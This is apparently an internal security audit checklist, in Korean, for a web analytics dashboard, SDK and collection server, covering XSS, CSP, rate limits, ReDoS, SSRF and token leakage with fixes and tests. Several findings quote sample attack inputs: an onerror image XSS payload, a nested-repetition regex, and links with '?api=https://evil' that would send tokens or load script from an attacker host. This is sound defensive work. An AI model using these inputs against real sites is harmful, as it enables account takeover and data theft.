# 보안 점검표 (2026-11-04)

로드맵 50번. 저장소 공개(42) 전에 수집 서버·대시보드·랜딩·SDK·데이터 경로를 한 번 훑은 결과와, 그중 코드로 반영한 것. 점검 기준은 2026-11-04 작업 트리(1.0.0 이전 이력, 로드맵 40·41·48 작업분 포함). **점검 35건 · 반영 17건 · 이미 충족 13건 · 보류·해당 없음 5건**(2026-11-05 로드맵 55 S-29 추가, 로드맵 56 S-24 반영. 2026-11-09 `/security-review` 재점검으로 S-30~S-35 추가, S-30~S-34 반영).

점검 방법: 영역 6개(수집 입력 / 대시보드 API·인증 / 대시보드 화면(XSS·CSP) / 랜딩·배지·위젯 / SDK·개인정보 / 비밀값·의존성·배포)를 코드로 추적했다. 아래 "증거"는 전부 소스 또는 테스트에서 재현한 것만 적었다. 반영한 항목은 `tests/`에 회귀 테스트가 있고(`npm test`), 번호는 **이름**이라 항목이 닫혀도 당기지 않는다.

심각도: **HIGH** = 다른 사용자(멤버·방문자·구경하는 사람)가 로그인 토큰을 훔치거나 남의 설정을 바꿀 수 있음 / **MEDIUM** = 서비스 전체를 느리게·멈추게 하거나 약속(약관)을 어김 / **LOW** = 모범 사례·심층 방어.

## 0. 한눈에 보기

| # | 심각도 | 제목 | 상태 |
| --- | --- | --- | --- |
| S-01 | HIGH | 건물 이름이 대시보드 HTML에 그대로 들어감 — 편집 멤버·공개 마을 주인이 보는 사람의 토큰을 훔칠 수 있음 | 반영(이스케이프 + 스모크 테스트) |
| S-02 | HIGH | 방문자 경로·속성(`device`·`referrer`·커스텀)이 정보 패널에 그대로 들어감 — 사이트 ID만 알면 누구나 주인 대시보드에 스크립트 주입 | 반영(이스케이프 + 서버 열거형 검사) |
| S-03 | HIGH | 대시보드(Vercel)에 보안 응답 헤더 없음 — CSP·HSTS·nosniff·Referrer·프레임 | 반영(`apps/web/proxy.ts`·`next.config.ts`. 2026-11-05 로드맵 56: nonce CSP, `'unsafe-inline'` 제거) |
| S-04 | MEDIUM | IP 기준 속도 제한 없음 — 세션 ID를 바꿔 가며 보내면 세션·사이트 한도를 우회, 토큰·임베드 키 무제한 추측 | 반영(IP당 이벤트 1,200/분, 인증 실패 60/분 → 1분 차단) |
| S-05 | MEDIUM | SSE 구독 수 상한 없음 — 임베드 키 하나로 연결을 무한히 열어 메모리·파일 디스크립터 소진 | 반영(사이트당 200, 넘으면 503) |
| S-06 | MEDIUM | 건물 패턴·자동 이벤트 정규식을 그대로 컴파일 — 한 사이트의 편집 멤버가 `(a+)+` 꼴로 서버 전체를 멈출 수 있음(ReDoS) | 반영(중첩 반복 휴리스틱으로 거절) |
| S-07 | LOW | 랜딩이 수집 서버의 SDK를 불러오면서 CSP가 없고, 아무 곳에나 iframe 될 수 있음 | 반영(랜딩도 같은 nonce CSP + `frame-ancestors 'self'`, 임베드·공개 마을만 iframe 허용) |
| S-08 | LOW | 배지 SVG·JSON 응답에 `nosniff`·CSP 없음 — SVG를 직접 열면 스크립트 컨텍스트 | 반영 |
| S-09 | LOW | SDK SRI(무결성 해시) 안내 없음 | 반영(문서 + `npm run sdk:sri`) |
| S-10 | MEDIUM | 커스텀 이벤트 속성의 이메일·전화번호를 서버가 가리지 않음 — 약관 4절 약속을 코드가 받치지 않음 | 반영(저장 전 마스킹) |
| S-11 | — | 비밀값이 git 이력에 없는지 | 충족 |
| S-12 | — | 임베드 키 발급·비교·노출 범위 | 충족(만료는 S-25. 키로 **받는 내용**의 범위는 S-34에서 좁힘) |
| S-13 | — | 웹훅 주소 검증(SSRF) | 충족(서명은 S-26. PUT 경로만 검증하던 틈은 S-32에서 메움) |
| S-14 | — | 대시보드 인증(JWT 검증·개발 토큰·캐시) | 충족 |
| S-15 | — | 초대 링크 | 충족 |
| S-16 | — | 수집 입력 검증(크기·개수·타입·시각) | 충족 |
| S-17 | — | SDK가 모으는 것(쿠키 없음·경로만·IP 저장 안 함) | 충족 |
| S-18 | — | CORS | 충족(운영 설정 권장 → S-28) |
| S-19 | — | Supabase RLS와 service role 경계 | 충족(RLS는 행만 거르고 컬럼·INSERT는 못 거른다 → S-32·S-33에서 표 권한 회수) |
| S-20 | — | 의존성 | 충족 |
| S-21 | — | 로그·IP·GeoIP | 충족 |
| S-22 | — | 계정 삭제 연쇄 | 충족 |
| S-23 | — | 서비스워커 | 충족 |
| S-24 | LOW | CSP에서 `'unsafe-inline'`을 빼려면 인라인 핸들러 97개를 위임 리스너로 | 반영(2026-11-05, 로드맵 56: Next 이전 때 nonce + `'strict-dynamic'`) |
| S-25 | LOW | 임베드 키 만료 | 보류(의도: 배지·iframe은 영구 링크. 회전으로 대신) |
| S-26 | LOW | 웹훅 서명 | 해당 없음(슬랙·디스코드만 허용, 수신자가 검증하지 않음) |
| S-27 | LOW | 인증 토큰 캐시 5분 — 로그아웃·탈퇴 뒤 최대 5분 유효 | 보류(허용) |
| S-28 | LOW | 운영 서버 `ALLOWED_DASHBOARD_ORIGIN` 비어 있음(`*`) | 반영(2026-11-09 운영 `server/.env`에 켜짐. 서버가 쉼표 목록을 받아 로컬 개발 출처를 같이 둘 수 있다. 테스트 서버는 빈 값으로 띄운다) |
| S-29 | MEDIUM | 대시보드 SSE가 장기 로그인 토큰을 URL(`?token=`)에 실어 서버·프록시 로그, 브라우저 기록, Referer에 남음 | 반영(2026-11-05, 로드맵 55: 30초 일회용 티켓) |
| S-30 | HIGH | 대시보드 `?api=`를 검증 없이 받아 로그인 토큰(Bearer)·리프레시 토큰을 그 주소로 보냄 — 링크 하나로 계정 탈취, 주소가 `vt_conn`에 남아 계속 유출 | 반영(2026-11-09: `clientApi` 허용 목록 + 저장된 주소 교정) |
| S-31 | HIGH | 랜딩 `?api=`로 외부 스크립트 실행 — nonce 번들이 만든 `<script>`라 `'strict-dynamic'`이 통과시켜 CSP 우회, `vt_auth` 읽기 | 반영(2026-11-09: S-30과 같은 허용 목록) |
| S-32 | MEDIUM | 로그인 사용자가 Supabase REST로 `sites`에 직접 INSERT — 웹훅 주소 검증·사이트 5개 제한 우회, 서버가 내부망으로 POST(SSRF) | 반영(2026-11-09: 표 권한 회수 + INSERT 정책 삭제 + 읽기·발송 직전 재검증) |
| S-33 | MEDIUM | 보기 멤버가 Supabase REST로 `sites.webhook`·`embed_key`를 직접 조회(RLS는 행만 거름) — 슬랙·디스코드 채널에 임의 메시지 | 반영(2026-11-09: `anon`·`authenticated` 표 권한 전부 회수) |
| S-34 | MEDIUM | 임베드 키 연결이 주인과 같은 SSE 프레임을 받음 — 구매 금액·커스텀 속성·원본 경로·메모·알림이 공개 링크로 샘(공개 마을 안내·개인정보처리방침과 어긋남) | 반영(2026-11-09: 임베드용 구독자·링버퍼 분리, `server/embed.js` 허용 목록) |
| S-35 | HIGH(켜면) | `PEERS=1` 인스턴스 버스가 Supabase Realtime 공개 채널이라 익명 키만 있으면 메시지 위조·도청 | 보류(지금 꺼져 있음. 수평 확장 전에 비공개 채널 + 수신 값 검증) |

## 1. 반영한 것

### S-01 · 건물 이름 XSS (HIGH)

- **왜**: 건물 이름은 주인·편집 멤버가 `PUT /api/sites/:id/pages`로 정한다(30자, 문자 제한 없음). 대시보드는 이름표(`#labels`)·정보 패널·피드 문장에 이 이름을 `innerHTML`로 넣었다. 편집 멤버가 `<img src=x onerror=…>`(28자)를 이름으로 저장하면 그 사이트를 여는 주인·멤버, 그리고 **공개 마을 구경 링크**(같은 `visitown.vercel.app` 출처)로 들어온 누구에게나 스크립트가 돈다. 대시보드는 로그인 토큰을 `localStorage.vt_auth`에 두므로 토큰 탈취 = 계정 탈취.
- **증거**: `apps/web/shell/dashboard.js` `drawLabels`(`esc`)·`feedLine`(`page_view`, 조각 배열), `packages/ui/src/Info.tsx`(건물 이름·최근 이벤트 줄, React 텍스트 노드라 이스케이프가 기본). `tests/ui.test.js`가 같은 페이로드를 react-dom/server로 렌더해 확인한다. `tests/smoke.test.js` "보안: 건물 이름…" 테스트는 고치기 전 코드에서 `img[src="x"]` 요소가 생겨 실패했다.
- **조치**: 네 곳 모두 `esc()`로 감쌌다. 서버는 이름을 바꾸지 않는다(캔버스 글자는 안전하고, "<3 카페" 같은 이름을 막을 이유가 없다).
- **수용 기준**: 스모크 테스트 — 실제 서버에 이름 `광장<img src=x onerror=…>`를 저장하고 대시보드를 열었을 때 `window.__xss`가 없고 이름표에 `&lt;img`가 글자로 보인다.

### S-02 · 방문자 경로·속성 XSS (HIGH)

- **왜**: `/api/events`는 사이트 ID + 허용 origin 헤더만 보고 받는다. 둘 다 고객 사이트 HTML에 공개돼 있고 Origin 헤더는 브라우저 밖에서는 마음대로 적을 수 있다. 서버는 `page_path`(256자, 쿼리·해시만 제거)·`device`·`referrer`(64자 문자열)를 그대로 저장하고, 정보 패널이 "현재 페이지"와 태그에 그대로 넣었다. 즉 **누구나** 주인의 대시보드에서 스크립트를 돌릴 수 있었다.
- **증거**: `packages/ui/src/Info.tsx` `PropTags`(`PROP_LABEL.device[p.device]||p.device`), `CharInfo`의 `s.path||page.path`(React 텍스트 노드). 같은 스모크 테스트가 `device`·`referrer`·`page_path`에 페이로드를 넣는다.
- **조치**: 대시보드 두 곳 `esc()`. 서버 `store.normalize`는 `device`를 `desktop|mobile|tablet`, `referrer`를 `direct|search|social|ad`만 남기고 나머지는 버린다(`ENUM_PROPS`). 경로는 사이트마다 자유라 서버에서 막지 않는다.
- **수용 기준**: `tests/store.test.js` "보안 S-02·S-10" + 스모크 테스트.

### S-03 · 대시보드 보안 헤더 (HIGH)

- **왜**: Vercel 정적 배포에 헤더 설정이 없어 CSP·HSTS·`X-Content-Type-Options`·`Referrer-Policy`·프레임 제한이 전부 없었다. 외부 스크립트 주입·클릭재킹(계정 삭제·임베드 키 회전 버튼)·쿼리의 임베드 키가 폰트 CDN으로 새는 것(Referer)을 막는 층이 없었다.
- **조치**: 처음엔 `vercel.json`(정적 배포). 로드맵 56(2026-11-05)부터 `apps/web/next.config.ts`(`nosniff`·`Referrer-Policy: strict-origin-when-cross-origin`·`Permissions-Policy`·HSTS 2년, 모든 경로)와 `apps/web/proxy.ts`(요청마다 CSP·`X-Frame-Options`). CSP: `script-src 'self' 'nonce-…' 'strict-dynamic'`(Next가 자기 스크립트에 nonce를 붙이고, 그 스크립트가 만든 스크립트만 더 허용 — 랜딩의 SDK 로드), 스타일·폰트는 Google Fonts·jsDelivr(Galmuri)만(`style-src 'unsafe-inline'`은 둔다), `connect-src`는 `https:` + `localhost`(수집 서버 주소를 사용자가 정하므로 호스트를 못 박을 수 없다. https 대시보드에서 http LAN 서버는 어차피 혼합 콘텐츠로 막힌다), `img-src https:`(배지), `frame-src 'self'`(랜딩이 마을 iframe), `object-src 'none'`, `base-uri 'self'`, `form-action 'self'`. 프레임: `/embed/*`·`/town/*`와 옛 임베드 주소(`?embed=`)만 `frame-ancestors`·`X-Frame-Options` 없음(고객 사이트 iframe·OBS·미니 위젯). 나머지는 `frame-ancestors 'self'` + `SAMEORIGIN`. `public/legal/*.html`은 인라인 스크립트가 없어 nonce 없이 `script-src 'self'`.
- **왜 CSP 헤더이고 `<meta>`가 아닌가**: `frame-ancestors`·`X-Frame-Options`는 헤더로만 된다.
- **한계**: nonce는 동적 렌더링에서만 붙으므로 모든 페이지를 동적으로 낸다(정적 페이지의 Next 인라인 스크립트는 해시를 못 받는다. 트래픽이 작아 비용은 없다). `style-src 'unsafe-inline'`은 인라인 style 속성(배율·캠페인 색) 때문에 남았다(위험도 낮음).
- **수용 기준**: `tests/smoke.test.js`가 `next start`로 열어 `securitypolicyviolation` 0건·콘솔 오류 0건(`/demo`·`/app`·`/embed`·`/town`·`/`·`/design-system`). "헤더:" 테스트가 nonce가 요청마다 다르고 HTML 스크립트에 같은 nonce가 붙는지, `script-src`에 `'unsafe-inline'`이 없는지, 임베드·공개 마을만 프레임 허용인지, 옛 주소 redirect·rewrite를 확인한다. **배포 뒤 확인**: `curl -sI https://visitown.vercel.app/app | grep -i -E 'content-security|x-frame|strict-transport'`.

### S-04 · IP 기준 속도 제한 (MEDIUM)

- **왜**: 한도가 세션당 60/분·사이트당 6,000/분뿐이라 세션 ID를 매번 바꾸면 사이트 한도까지 그대로 들어왔고(세션 Map 6,000개/분), 토큰·임베드 키·초대 토큰은 무제한으로 추측할 수 있었다.
- **조치**: `server/index.js` — `/api/events`는 IP당 분당 `EVENTS_PER_IP_MIN`(기본 1,200. 회사망처럼 한 IP를 여럿이 쓰는 곳을 생각해 넉넉히) 넘으면 429 + `Retry-After: 60`. 인증 실패(토큰·임베드 키 틀림)는 IP당 분당 `AUTH_FAIL_PER_IP_MIN`(기본 60)을 넘으면 그 IP의 인증이 필요한 요청을 1분간 429로 막는다(올바른 토큰도). IP는 `server/geo.js` `clientIp`(프록시 헤더 → 소켓)이고 저장하지 않는다(분 단위 카운터만, 1분마다 비움).
- **수용 기준**: `tests/limits.test.js` S-04 두 건(한도를 3·2로 낮춘 서버).

### S-05 · SSE 구독 상한 (MEDIUM)

- **왜**: 임베드 키는 공개 링크(배지·iframe·공개 마을)에 들어 있어 누구나 `stream?embed=`를 열 수 있다. 연결 수 제한이 없어 한 사이트로 연결을 계속 열면 메모리·디스크립터가 바닥난다.
- **조치**: 사이트당 `MAX_SSE_PER_SITE`(기본 200) 이상이면 503 + `Retry-After: 30`. 대시보드는 `retry:`로 다시 붙는다.
- **수용 기준**: `tests/limits.test.js` S-05(상한 1: 둘째 연결 503, 첫 연결을 끊으면 다시 200).

### S-06 · 정규식 ReDoS (MEDIUM)

- **왜**: 건물 `pattern`(300자)·이벤트 설정 `auto`(300자)는 편집 멤버가 적고 서버가 모든 `page_view`마다 `RegExp.test`를 돈다. 서버는 모든 사이트가 공유하므로 한 사이트의 `^/(a+)+$` + 긴 경로 한 번이면 이벤트 루프가 멈춘다.
- **조치**: `store.unsafeRegex` — 반복이 든 그룹에 다시 반복이 붙는 꼴(`(a+)+`, `(\d*\s)*`, `(x{2,})+`, 중첩 그룹 포함)을 거절한다. 건물 패턴은 400("패턴에 중첩 반복이 있어 쓸 수 없어요"), 자동 이벤트 패턴은 조용히 버린다(잘못된 정규식과 같은 취급). 완전한 판정은 아니지만(예: `(a|aa)+`) 흔한 폭발 패턴은 잡고, 의존성 0을 지킨다.
- **수용 기준**: `tests/store.test.js` S-06(9가지 패턴), `tests/limits.test.js` S-06(API 400).

### S-07 · 랜딩 CSP·프레임 (LOW)

- **왜**: 랜딩(`/`, 예전 `/landing/`)은 대시보드와 같은 출처라 여기서의 XSS도 `vt_auth`를 읽을 수 있다. 공개 마을 목록의 이름·도메인은 이미 이스케이프하고 있었지만 헤더가 없었다.
- **조치**: 처음엔 랜딩 전용 CSP(`vercel.json`, 수집 서버 호스트 허용). 로드맵 56부터 랜딩도 같은 nonce CSP를 받고, SDK는 nonce 스크립트(`app/LandingClient.tsx`)가 `createElement('script')`로 만들어 `'strict-dynamic'`으로 허용된다 — 호스트를 CSP에 적지 않으니 **수집 서버를 옮겨도 CSP는 안 바꾼다**(`lib/api.ts`의 `DEFAULT_API`만). `frame-ancestors 'self'`.
- **수용 기준**: 스모크 "랜딩(/)…" — CSP 아래에서 SDK 로드·마을 iframe(`/embed/[key]`)·배지가 오류 0·CSP 위반 0으로 뜬다.

### S-08 · 배지·JSON 응답 헤더 (LOW)

- **조치**: 모든 JSON 응답과 `/visitown.js`에 `X-Content-Type-Options: nosniff`. 배지 SVG에는 추가로 `Content-Security-Policy: default-src 'none'; style-src 'unsafe-inline'`(이미 `label`은 이스케이프하지만 SVG를 주소창에 직접 열어도 스크립트가 돌지 않게).
- **수용 기준**: `tests/limits.test.js` S-08.

### S-09 · SDK SRI 안내 (LOW)

- **판단**: `<script src="https://HOST/visitown.js">`는 서버가 배포마다 바꾸는 파일이라 SRI 해시를 붙이면 업데이트 때마다 깨진다. SRI는 **고정 버전**을 쓸 때만 의미가 있다: npm 배포 뒤 `https://cdn.jsdelivr.net/npm/@visitown/sdk@0.1.0/visitown.js`처럼 버전을 박고 `data-api="https://HOST"`를 같이 준다(SDK는 `script.src`에서 서버 주소를 유추하므로 CDN에서 부르면 `data-api`가 필요).
- **조치**: `npm run sdk:sri`가 현재 `sdk/visitown.js`의 `sha384-…`를 찍는다. README 설치 절에 적었다.

### S-10 · 커스텀 속성 개인정보 마스킹 (MEDIUM)

- **왜**: 약관 4절·개인정보처리방침은 "커스텀 이벤트 속성에 개인정보를 넣지 말라, 넣어도 가린다"고 약속한다. SDK는 `js_error` 메시지만 가렸고 서버는 아무것도 가리지 않아 `track('purchase', { email: … })`이 그대로 DB에 남았다.
- **조치**: `store.maskPii` — 커스텀 속성 문자열(100자)에서 이메일은 `<email>`, 전화번호 꼴(`010-1234-5678`, `+82 10 1234 5678`, `212-555-0199`)은 `<phone>`. 주문번호·날짜 같은 숫자만 있는 값은 건드리지 않는다. 시스템 속성(`plan`·`ua` 등)은 대상이 아니다.
- **수용 기준**: `tests/store.test.js` "보안 S-02·S-10".

### S-29 · 스트림 토큰이 URL에 (MEDIUM)

- **왜**: `EventSource`는 요청 헤더를 못 붙여 대시보드가 `stream?token=<JWT>`로 열었다. URL은 Fly·Vercel 프록시 로그, 브라우저 기록, 북마크, (이미지·링크가 있으면) Referer에 남고, 토큰은 로그인 만료(1시간)까지 모든 API에 통한다.
- **조치**: `POST /api/sites/:id/stream-ticket`(Bearer 헤더, 멤버만) → 30초짜리 일회용 티켓. base64url(JSON{site,user,role,exp,nonce}) + HMAC-SHA256(`STREAM_TICKET_SECRET` → `JWT_SECRET` → 프로세스 난수). 서명 검증이라 인스턴스 간 공유 상태가 없고(PEERS는 비밀값을 같이 둔다), 쓴 nonce는 만료까지 기억해 재사용을 막는다. 스트림은 `?ticket=`·`?embed=`만 받고 `?token=`은 401. 대시보드(`p6.js` `live.open`)는 끊기면 브라우저 자동 재접속(같은 URL = 쓴 티켓) 대신 새 티켓 + `lastEventId`로 직접 다시 연다. 임베드 키는 공개 설계라 그대로.
- **수용 기준**: `tests/api.test.js` "S-29"(401/403/405·재사용·위조·본문 변조·만료·로그 미노출), `sse.test.js`·`limits.test.js`·`peers.test.js`가 티켓으로 연결.

### S-30 · 대시보드 `?api=`로 토큰 유출 (HIGH)

- **왜**: 대시보드는 `?api=`(또는 저장된 `vt_conn.api`)를 그대로 수집 서버 주소로 썼다. 그 주소로 `Authorization: Bearer <JWT>`를 보내고, 그 서버의 `/api/config`가 준 `supabaseUrl`로 리프레시 토큰까지 보낸다. CSP `connect-src https:`는 막지 못한다. 로그인한 사용자가 `/app?api=https://evil&site=x` 링크를 열면 클릭 없이 토큰이 전송되고, 주소가 `vt_conn`에 저장돼 다음 방문에도 샌다. 탈취한 토큰으로 사이트 읽기·설정 변경·`DELETE /api/account`까지 된다.
- **증거**: `apps/web/shell/dashboard.js` `CONN`(주소 수용·저장)·`api()`(Bearer)·`refreshIfNeeded`(리프레시 토큰), `apps/web/app/town/[slug]/page.tsx`(서버가 `?api=`로 fetch, LOW).
- **조치**: `apps/web/lib/api.ts` `clientApi(query, host)`가 허용 목록을 본다 — `DEFAULT_API`이거나, 페이지가 로컬(`localhost`·`127.*`)일 때의 `http://localhost|127.0.0.1[:port]`(개발·테스트)만 받고 나머지는 환경값으로 돌린다. 대시보드 `CONN`·랜딩·공개 마을 서버 렌더링(`headers().host` 기준)이 전부 이 함수를 쓴다. 부팅 때 저장된 `vt_conn.api`도 같은 규칙으로 고쳐 써서 이미 오염된 브라우저도 복구된다. 임베드(`/embed/[key]`)만 `embedApi`로 예외 — 토큰이 없고 임베드 키로 읽기만 하며, iframe·미니 위젯을 넣는 쪽(자기 서버를 쓰는 사이트)이 주소를 정한다. `supabaseUrl`은 허용된 서버의 응답이므로 그대로 둔다.
- **수용 기준**: `tests/smoke.test.js` "보안 S-30·S-31" — `vt_auth`·오염된 `vt_conn`이 있는 브라우저로 `/app?api=https://evil.invalid`를 열어도 그 주소로 요청이 0건이고 `vt_conn.api`가 교정된다. `clientApi` 규칙 6가지(배포 페이지는 localhost 서버도 거절).

### S-31 · 랜딩 `?api=`로 외부 스크립트 실행 (HIGH)

- **왜**: 랜딩(`app/LandingClient.tsx`)은 `?api=`로 SDK 주소를 만들어 `createElement('script')`로 넣는다. nonce가 붙은 번들이 만든 스크립트라 `'strict-dynamic'`이 출처와 상관없이 허용한다 — S-07에서 "호스트를 CSP에 적지 않아도 된다"고 한 바로 그 성질이 뒤집혀 CSP 우회가 됐다. `https://visitown.vercel.app/?api=https://evil`을 열면 `evil/visitown.js`가 우리 출처에서 돌아 `localStorage.vt_auth`를 읽는다.
- **조치**: S-30의 `clientApi` 허용 목록이 그대로 적용된다(랜딩은 이미 그 함수를 썼다). 배포된 페이지에서 `?api=`는 `DEFAULT_API`로만 풀린다.
- **수용 기준**: 같은 스모크 테스트 — `/?api=https://evil.invalid`를 열었을 때 `visitown.js` 스크립트의 `src`가 그 주소가 아니고 요청도 0건.

### S-32 · `sites` 직접 INSERT로 웹훅 검증 우회 (MEDIUM)

- **왜**: 웹훅 주소 허용 목록(`validUrl`)은 `PUT …/webhook`에만 있었다. Supabase 기본 권한은 `authenticated`에게 모든 표를 열어 두고 `owner writes sites` 정책이 INSERT를 허용했으므로, GitHub 계정만 있으면 익명 키 + 자기 JWT로 `sites`에 내부망 주소가 든 행을 넣을 수 있었다. 서버는 60초마다 DB를 다시 읽어 그 행을 받아들이고, 주인 권한으로 `POST …/webhook`(테스트 발송)이나 알림을 부르면 수집 서버가 내부망으로 POST 한다(본문 고정, 상태 코드만 노출). 같은 길로 사이트 5개 제한도 넘는다.
- **조치**: `docs/supabase.sql` 끝의 마이그레이션 — `anon`·`authenticated`의 public 표·시퀀스 권한 전부 회수(기본 권한도), `owner writes sites` 정책 삭제. 대시보드·SDK·MCP는 REST를 직접 부르지 않으므로(S-19) 영향이 없다. 심층 방어로 `server/supabase.js` `webhookFromDb`가 읽을 때 `normalizeWebhook`을 다시 거치고, `server/alerts.js` `post`는 보내기 직전에 `validUrl`을 한 번 더 보며 `redirect: 'error'`로 리다이렉트도 따라가지 않는다. **운영 Supabase SQL Editor에서 이 블록을 실행해야 한다.**
- **수용 기준**: 임시 postgres에 `docs/supabase.sql` 전체 적용 뒤 `set role authenticated`로 `select`·`insert`가 모두 `permission denied`. `tests/limits.test.js` S-32(`Alerts.post`가 내부망·http·흉내 낸 호스트를 거절).

### S-33 · 보기 멤버의 웹훅 주소·임베드 키 직접 조회 (MEDIUM)

- **왜**: 서버는 보기 멤버에게 `embed`·`webhook`을 403으로 막지만, RLS `member reads sites`는 행만 거르고 컬럼은 못 거른다. 보기 초대를 수락한 사람이 `GET {supabase}/rest/v1/sites?select=webhook,embed_key`를 부르면 슬랙·디스코드 웹훅 주소가 나와 그 채널에 임의 메시지를 보낼 수 있고, 멤버에서 빠져도 웹훅을 새로 만들기 전까지 쓸 수 있다.
- **조치**: S-32와 같은 마이그레이션(표 권한 회수). RLS 정책은 심층 방어로 남긴다. **보기 멤버가 있었던 사이트는 웹훅 URL을 새로 발급하고 임베드 키를 회전하는 것을 권한다.**
- **수용 기준**: 위 SQL 검증(authenticated `select` 거부).

### S-34 · 임베드 키로 금액·커스텀 속성까지 스트리밍 (MEDIUM)

- **왜**: 임베드 키 연결(공개 마을·고객 홈페이지 iframe·OBS·미니 위젯)이 주인과 같은 구독자 집합에 들어가 같은 링버퍼·스냅샷을 받았다. 공개·위젯을 켰거나 키를 게시한 사이트는 `curl -N '…/stream?embed=키'`로 건별 구매 금액, 커스텀 속성, 원본 경로, 메모(글·작성자), 알림·기념 문장(매출 포함)을 로그인 없이 볼 수 있었고 `lastEventId`로 최근 것을 되돌려 받을 수도 있었다. 공개 마을 화면의 "방문자 정보·설정은 없고 지금 있는 사람들만" 안내와 개인정보처리방침에 어긋났다.
- **조치**: `server/index.js`가 구독자(`subscribers`/`embedSubs`)·링버퍼(`rings`/`embedRings`)·대기 버퍼(`pending`/`pendingEmbed`)·스냅샷 캐시를 둘로 나눈다. `broadcast`는 프레임마다 `server/embed.js` `view(frame, data)`를 거쳐 임베드용 링버퍼에 따로 넣고, `null`이면 보내지 않는다. 허용 목록: 프레임은 `snapshot`·`event`·`eventtypes`·`pages`·`unlocks`·`trails`·`weather`·`vitals`(`milestone`·`alert`는 없음), 이벤트는 `event_id`·`site_id`·`session_id`·`event_type`·`page_path`(건물 키)·`timestamp`·`started_at`과 속성 `me`·`country`·`rare`·`emoji`·`reason`·`bot`·`visit_no`만(`path`·`amount`·`device`·`referrer`·`plan`·`ua`·커스텀 속성 없음), `note`·`web_vital` 이벤트는 통째로 제외. 스냅샷에서 `lastEventAt`·건물 `pattern`·이벤트 설정 `auto`·해금 진행도·기록을 뺀다. S-05 상한·`/healthz`·날씨 루프·핑·계정 삭제는 두 집합을 합쳐 센다. **새 SSE 프레임이나 필드를 임베드에도 보내려면 `server/embed.js`의 목록에 더해야 한다.**
- **수용 기준**: `tests/sse.test.js` S-34 두 건 — `view`의 단위 검사(alert·milestone·note·web_vital 제거, 필드 허용 목록), 실제 스트림에서 임베드 연결은 금액·커스텀 속성·원본 경로·메모가 없고 주인 연결은 전부 받으며 임베드도 자기 링버퍼로 resume 한다. 부하 테스트(`tests/load/run.js`)는 티켓 연결이라 경로가 같고, `docs/load.md` 3절에 같은 조건으로 재측정한 수치를 적었다(p99 27ms·유실 0, 변화 없음).

## 2. 이미 충족한 것 (확인만)

- **S-11 비밀값 이력**: `git log -p --all -- '.env*'`가 비어 있고, 추적 파일 전체에서 `eyJ…`(JWT)·`service_role`·`SUPABASE_SERVICE_KEY=값` 패턴이 없다. `.gitignore`가 `.env`·`.env.*`를 막고 `.env.example`만 둔다. `server/sites.json`은 추적되지만 로컬 데모 사이트 설정뿐(키 없음). 랜딩 `VT_LANDING`의 사이트 ID·임베드 키·서버 호스트는 **읽기 전용 공개값**이다(임베드 키로 할 수 있는 것은 스트림·배지 읽기뿐). 42 공개 전 다시 한 번 같은 명령으로 확인한다.
- **S-12 임베드 키**: `emb_` + 96비트 난수, `crypto.timingSafeEqual`로 비교, 보기 멤버는 조회도 403, 회전(`POST …/embed`)하면 예전 링크는 즉시 끊김. 공개 마을·미니 위젯이 켜진 사이트는 키가 공개 API에 나오는데 이는 설계(그 키로 읽을 수 있는 것은 마을 화면뿐).
- **S-13 웹훅 SSRF**: `server/alerts.js` `validUrl` — https + `hooks.slack.com`·`discord.com`(계열)만, 6초 타임아웃. 내부망 주소로 보낼 수 없다.
- **S-14 인증**: Supabase 사용자 JWT를 HS256(JWT secret) 또는 JWKS(ES256/RS256)로 직접 검증하고 만료를 본다. 둘 다 안 되면 `/auth/v1/user`로 확인. 개발 토큰 `dev`는 DB가 없을 때만 통하고 운영에서는 `ALLOW_DEV_TOKEN=1`을 켜야 한다. 쿼리 `?token=`은 EventSource가 헤더를 못 붙여서 받는다(Referrer-Policy로 밖으로 새지 않게 했다, S-03). 역할은 `roleOf`로 요청마다 계산하고 보기 멤버는 쓰기·임베드·웹훅 403.
- **S-15 초대**: `inv_` + 96비트, 7일 만료, 사용자당 분당 30회, 같은 역할 링크는 하나만, 더 높은 역할을 내리지 않음.
- **S-16 수집 입력**: 본문 64KB·배치 1~20·`event_id`/`session_id` 80자·경로 256자(쿼리·해시 제거)·속성 화이트리스트 + 커스텀 10개×100자·타입 이름 `[a-z_]{2,32}`·사이트당 커스텀 타입 50개·시각은 미래 5초로 고정·`greet`는 정해진 이모지만 세션당 분당 12·`web_vital`은 값 범위 검사. 봇 UA는 접속자 수에서 제외.
- **S-17 SDK**: 쿠키 없음, 세션 ID는 `sessionStorage`(탭마다), `localStorage`는 `vt_seen`·`vt_me`뿐, 경로만 보내고 쿼리·해시는 안 보냄, 리퍼러는 분류(`search|social|direct|ad`)만, 시간대·언어는 서버가 나라 코드로 바꾼 뒤 버림, `credentials: 'omit'`, 오류 메시지는 이메일·토큰·긴 숫자를 가리고 120자. IP는 어디에도 저장하지 않는다.
- **S-18 CORS**: 수집은 사이트별 `allowed_origins`(등록 도메인 http/https/www + `localhost:3000`). 대시보드 API는 Bearer 토큰이라 쿠키 기반 CSRF가 없고, `ALLOWED_DASHBOARD_ORIGIN`을 주면 그 출처만 허용한다(S-28).
- **S-19 RLS**: 서버만 service role을 쓰고 대시보드는 Supabase REST를 직접 부르지 않는다(Auth만). 테이블 RLS(주인·멤버 select)는 심층 방어.
- **S-20 의존성**: 서버 런타임 의존성 0, 루트 devDeps 4개(fast-check·playwright·typescript·esbuild), `packages/ui` 의존성 react·react-dom(브라우저 번들에 들어감, `npm audit` 0건), SDK 의존성 0. 데모 사이트(`demo-site`)는 Next 16.4.5·React 19(2026-11-09 올림. 14.2.x는 `npm audit`에 critical·high가 남아 있었고 고친 선이 16.3+뿐이었다. 패치 라인 최신 유지는 사람이 할 일).
- **S-21 로그·GeoIP**: 로그에 IP·토큰을 남기지 않는다(인증 실패는 경로와 토큰 유무만). `GEOIP_URL`은 선택이고 기본 꺼짐. 켤 때는 https 제공자를 쓴다(`.env.example`의 ip-api 예시는 http라 IP가 평문으로 나간다).
- **S-22 계정 삭제**: 소유 사이트(매핑·이벤트·집계·멤버·초대 연쇄) → 멤버 자격 → Auth 사용자 순. 본인 토큰만.
- **S-23 서비스워커**: 캐시 없음, `fetch`를 가로채지 않음, 같은 출처만.

## 3. 보류·해당 없음

- **S-24 `'unsafe-inline'` 제거**: 반영(2026-11-05, 로드맵 56). 인라인 핸들러 속성은 실제로 0개였고(97개는 `.onclick=` 속성 대입이라 CSP와 무관), 인라인 `<script>`는 앱 전체가 하나였다. Next 이전으로 스크립트가 외부 청크가 되면서 nonce + `'strict-dynamic'`으로 뺐다. 남은 인라인은 밝기 스크립트 하나(`lib/shell-head.ts`, nonce).
